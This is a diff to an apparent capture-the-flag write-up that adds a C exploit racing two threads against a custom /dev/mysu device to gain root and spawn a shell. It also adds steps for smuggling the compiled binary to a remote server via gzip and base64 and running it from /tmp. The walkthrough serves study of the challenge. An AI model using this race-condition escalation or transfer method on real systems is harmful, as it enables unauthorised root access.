@@ -264,8 +264,99 @@ if sim_manager.found:
 > EXPLOIT C CODE
 
 ```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <pthread.h>
+
+// consist of user UID and calculated hash
+char user_uid[] = {
+  0xe8, 0x03, 0x00, 0x00,
+  0x6e, 0x63, 0x7b, 0x89,
+  0x00, 0x02, 0x02, 0x08
+};
+
+int flag = 0;
+
+void *get_root(void *args){
+    int fd; 
+    while(!flag){
+        user_uid[0] = 0;
+        user_uid[1] = 0;
+        fd = open("/dev/mysu", O_RDWR); // open /dev/mysu with read and write permission
+        write(fd, user_uid, sizeof(user_uid));
+        close(fd);
+        
+        // checker for root uid.
+        if (getuid() == 0){
+            flag = 1;
+            system("/bin/sh");
+        }
+    }
+}
+
+void *get_user(void *args){
+    int fd; 
+    while(!flag){
+        user_uid[0] = 0xe8;
+        user_uid[1] = 0x03;
+        fd = open("/dev/mysu", O_RDWR); // open /dev/mysu with read and write permission
+        write(fd, user_uid, sizeof(user_uid));
+        close(fd);
+        
+        // checker for root uid.
+        if (getuid() == 0){
+            flag = 1;
+            system("/bin/sh");
+        }
+    }
+}
+
+int main(void){
+
+    pthread_t thread_root;
+    pthread_t thread_user;
+
+    // create 2 threads
+    pthread_create(&thread_root, NULL, get_root, NULL);
+    pthread_create(&thread_user, NULL, get_user, NULL);
+
+    pthread_join(thread_root, NULL);
+    pthread_join(thread_user, NULL);
+
+    return 0;
+}
+```
+
+35. Now to send our exploit to the remote server is quite tricky.
+36. What I did is to gzip our exploit binary first, then grab the base64 encoded.
+37. Afterwards, decode it at the remote server and unzip it again.
+
+> STEPS
 
 ```
+1. At our local machine do:
+
+gcc exploit.c -l pthread -o exploit
+gzip exploit
+base64 exploit
+
+2. At the remote server
+
+[+] Need to move to /tmp, the only dir that is writeable.
+
+cd /tmp
+echo "YOUR_BASE64" > /tmp/exploit.gz.b64
+base64 -d exploit.gz.b64
+gzip -d exploit.gz
+chmod +x exploit
+./exploit
+```
+
+> RESULT
+
+
 
 ## FLAG
 
